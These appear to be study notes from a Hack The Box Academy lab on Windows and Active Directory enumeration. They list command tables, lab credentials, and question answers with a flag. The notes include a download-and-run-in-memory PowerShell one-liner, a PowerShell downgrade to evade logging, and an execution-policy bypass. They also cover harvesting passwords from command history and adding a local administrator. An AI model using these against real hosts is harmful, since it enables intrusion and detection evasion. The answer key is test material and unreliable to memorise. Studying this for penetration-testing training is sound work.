
#### Basic Enumeration Commands

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |
| systeminfo                                              | Prints a summary of the host's information                                                 |

### Enumeration with PowerShell
| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell \PSReadline\ConsoleHost_history.txt`                                | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

### Downgrading PowerShell

>[!Info]
> Downgrading PowerShell from version 3.0 to 2.0 or older can cause actions to not be logged in Event Viewer.

```go
Get-host
```

```go
powershell.exe -version 2
```

##### Verify if you are still generating logs
>[!tip]
 > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
 
![[examinig_powershell_event_log.png]]


-----------------------------

## Checking Defenses

##### Firewall Checks
```go
netsh advfirewall show allprofiles
```

##### Windows Defender Check
```go
sc query windefend
```

##### Get-MpComputerStatus - Verify Defenders status and configuration settings 
```go
Get-MpComputerStatus
```

##### Verify you are alone on the box
```go
qwinsta
```

-----------------------------------------

## Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

#### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

### Net Commands
>[!Info]
> Can list information such as:
> - local and domain users
> - groups
> - hosts
> - specific users in groups
> - domain controllers
> - password requirements

#### Table of Useful Net Commands

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

##### Information about a Domain User
```go
net user /domain wrouse
```

### Dsquery

>[!info]
> - A tool to help find Active Directory objects
> - Exists on any host with Active Directory Domain Services Role installed

##### User Search
```go
dsquery user
```

##### Computer Search
```go
dsquery computer
```

##### Wildcard Search
```go
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

##### Combine Dsquery with LDAP search filters

*This query looks for users with the PASSWD_NOTREQD flag set*
```go
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

##### Searching for Domain Controllers
```go
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

# Questions

Username
```go
htb-student
```

Password
```go
Academy_student_AD!
```

```go
xfreerdp /u:htb-student /p:'Academy_student_AD!' /v:10.129.18.56 /smart-sizing:3400x1600
```

### Question 1:  Enumerate the host's security configuration information and provide its AMProductVersion.

Answer
```go
4.18.2109.6
```

```go
Get-MpComputerStatus
```

### Question 2: What domain user is explicitly listed as a member of the local Administrators group on the target host?

Answer:
```go
adunn
```

```go
net localgroup Administrators
```

### Question 3: Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.

Answer:
```go
HTB{LD@P_I$_W1ld}
```



```go
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -attr Description
```


